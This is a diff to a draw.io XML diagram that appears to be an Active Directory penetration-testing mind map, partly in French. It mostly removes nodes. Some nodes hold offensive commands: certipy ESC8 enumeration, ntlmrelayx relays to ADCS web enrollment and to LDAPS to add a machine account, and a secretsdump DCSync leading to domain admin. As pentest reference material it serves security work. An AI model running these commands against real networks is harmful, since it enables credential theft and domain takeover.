@@ -368,30 +368,6 @@
         <mxCell id="2ArGYso1SfPXtdhOZaz5-4" parent="1" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#60a917;fontColor=#ffffff;strokeColor=#2D7600;" value="&lt;b&gt;On est sur le réseau sans creds&lt;/b&gt;" vertex="1">
           <mxGeometry height="82.5" width="160" x="-230" y="210" as="geometry" />
         </mxCell>
-        <mxCell id="_LFIwpbgAgwoRebmZAz1-11" edge="1" parent="1" source="_LFIwpbgAgwoRebmZAz1-4" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fillColor=#e51400;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" target="_LFIwpbgAgwoRebmZAz1-7">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="_LFIwpbgAgwoRebmZAz1-4" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="&lt;div&gt;&lt;b&gt;ADCS&lt;br&gt;&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;ESC8&lt;/b&gt; : web enrollement is up ?&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy find -u user@domain.local -p pass -dc-ip [ip] -vulnerable&lt;/font&gt;&lt;/div&gt;" vertex="1">
-          <mxGeometry height="90" width="360" x="1650" y="791" as="geometry" />
-        </mxCell>
-        <mxCell id="_LFIwpbgAgwoRebmZAz1-12" edge="1" parent="1" source="_LFIwpbgAgwoRebmZAz1-7" style="edgeStyle=segmentEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;fillColor=#e51400;strokeColor=#2F5B7C;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" target="_LFIwpbgAgwoRebmZAz1-9">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <object label="&lt;div&gt;relay to the web enrollement ADCS&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;ntlmrelay.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" id="_LFIwpbgAgwoRebmZAz1-7">
-          <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1">
-            <mxGeometry height="70" width="176" x="2090" y="800" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="Kfw4rbIWasHMYPfyiLrn-2" edge="1" parent="1" source="_LFIwpbgAgwoRebmZAz1-9" style="edgeStyle=segmentEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" target="ETCpI3GuiIKZf-ECZUgB-3" value="">
-          <mxGeometry relative="1" as="geometry">
-            <mxPoint x="2794" y="836" as="targetPoint" />
-          </mxGeometry>
-        </mxCell>
-        <object label="Get the certificate" convert_pfx_64_to_PFX="cat cert4.b64 | base64 -d &gt; crt.pfx" id="_LFIwpbgAgwoRebmZAz1-9">
-          <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1">
-            <mxGeometry height="60" width="120" x="2326" y="806" as="geometry" />
-          </mxCell>
-        </object>
         <mxCell id="A1-m0vl6AtPKf8VYdlRc-2" edge="1" parent="1" source="hefA_bYV9p1Cq4kSP_zY-9" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fontSize=12;startSize=8;endSize=8;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" target="OzdCo0pd7L-W225KIUEy-3">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
@@ -403,11 +379,6 @@
             <mxGeometry height="120" width="260" x="1360" y="570" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="hefA_bYV9p1Cq4kSP_zY-19" edge="1" parent="1" source="hefA_bYV9p1Cq4kSP_zY-10" style="edgeStyle=segmentEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;strokeColor=#2F5B7C;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" target="_LFIwpbgAgwoRebmZAz1-4">
-          <mxGeometry relative="1" as="geometry">
-            <mxPoint x="1650" y="835" as="targetPoint" />
-          </mxGeometry>
-        </mxCell>
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-10" parent="1" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;spacingLeft=-16;" value="&lt;div&gt;&lt;font style=&quot;font-size: 16px;&quot;&gt;&lt;b&gt;Relay to HTTP&amp;nbsp;or HTTPS&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;font style=&quot;font-size: 16px;&quot;&gt;&lt;b&gt;&lt;br&gt;&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;div align=&quot;left&quot;&gt;&lt;span style=&quot;color: light-dark(rgb(89, 249, 6), rgb(83, 246, 9));&quot;&gt;Prérequis:&lt;/span&gt;&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;&lt;span style=&quot;color: light-dark(rgb(89, 249, 6), rgb(83, 246, 9));&quot;&gt;HTTP :&amp;nbsp;&lt;span style=&quot;color: light-dark(rgb(89, 249, 6), rgb(83, 246, 9));&quot;&gt;No Prerequisites&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;&lt;span style=&quot;color: light-dark(rgb(89, 249, 6), rgb(83, 246, 9));&quot;&gt;HTTPS: EPA not Required&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;" vertex="1">
           <mxGeometry height="110" width="249" x="1365.5" y="717" as="geometry" />
         </mxCell>
@@ -454,22 +425,11 @@
           <mxGeometry height="63" width="330" x="681" y="-830" as="geometry" />
         </mxCell>
         <mxCell id="i_53WrwCQ5BU9_YikGZj-1" parent="1" style="whiteSpace=wrap;html=1;fontSize=14;align=center;rounded=1;" value="&lt;div align=&quot;center&quot;&gt;permet de récupérer la liste des users de l&#39;AD (auto)&lt;br&gt;&lt;/div&gt;" vertex="1">
-          <mxGeometry height="50" width="349" x="1790" y="909" as="geometry" />
+          <mxGeometry height="50" width="349" x="1796" y="900" as="geometry" />
         </mxCell>
         <object label="création d&#39;un compte machine (MAQ)" cmd="ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --delegate-access" id="QkhrWf05NAjAX-w3R0dh-1">
           <mxCell parent="1" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" vertex="1">
             <mxGeometry height="50" width="259" x="1796" y="966" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="RcJsrnn1SgcJtgKbqCFV-1" parent="1" style="rounded=1;whiteSpace=wrap;html=1;fontSize=13;fillColor=#c64600;strokeColor=#B20000;fontColor=#ffffff;" value="Domain Admin right" vertex="1">
-          <mxGeometry height="87.5" width="150" x="2800" y="645" as="geometry" />
-        </mxCell>
-        <mxCell id="IsSizIxUDjp_11kIo4Un-2" edge="1" parent="1" source="RcJsrnn1SgcJtgKbqCFV-2" style="edgeStyle=orthogonalEdgeStyle;shape=connector;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0.5;entryY=1;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" target="RcJsrnn1SgcJtgKbqCFV-1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <object label="&lt;div&gt;DCsync&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;secretdump.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="secretsdump -k -no-pass OLYMPIQUELYONNAIS.COM/&#39;DC01$&#39;@DC03.OLYMPIQUELYONNAIS.COM" id="RcJsrnn1SgcJtgKbqCFV-2">
-          <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1">
-            <mxGeometry height="60" width="120" x="2700" y="805" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="TZkWSDr6438spexavPfF-1" edge="1" parent="1" source="X6wlxV_FrzrZ-9Moiesy-8" style="rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=-0.003;entryY=0.62;entryDx=0;entryDy=0;entryPerimeter=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;edgeStyle=orthogonalEdgeStyle;endArrow=block;endFill=1;" target="KTRm8kq6GDk7_ihK_bxa-8">
@@ -579,12 +539,6 @@
         </mxCell>
         <mxCell id="sDObpYn11-b9JtlXUMiq-2" parent="1" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" value="Crack Hash" vertex="1">
           <mxGeometry height="16.119999999999997" width="116" x="1754" y="47.5" as="geometry" />
-        </mxCell>
-        <mxCell id="IsSizIxUDjp_11kIo4Un-3" edge="1" parent="1" source="ETCpI3GuiIKZf-ECZUgB-3" style="edgeStyle=orthogonalEdgeStyle;shape=connector;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" target="RcJsrnn1SgcJtgKbqCFV-2" value="">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="ETCpI3GuiIKZf-ECZUgB-3" parent="1" style="whiteSpace=wrap;html=1;rounded=1;fillColor=#6d8764;fontColor=#ffffff;strokeColor=#3A5431;" value="&lt;div&gt;Lateral Mouvement&lt;/div&gt;&lt;div&gt;Pass the certificate&lt;br&gt;&lt;/div&gt;" vertex="1">
-          <mxGeometry height="60" width="120" x="2500" y="805" as="geometry" />
         </mxCell>
         <mxCell id="WNUIlei8VlNFuhWwirbG-5" edge="1" parent="1" source="WNUIlei8VlNFuhWwirbG-1" style="edgeStyle=orthogonalEdgeStyle;shape=connector;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=11;fontColor=default;labelBackgroundColor=default;endArrow=block;endFill=1;" target="WNUIlei8VlNFuhWwirbG-4">
           <mxGeometry relative="1" as="geometry" />
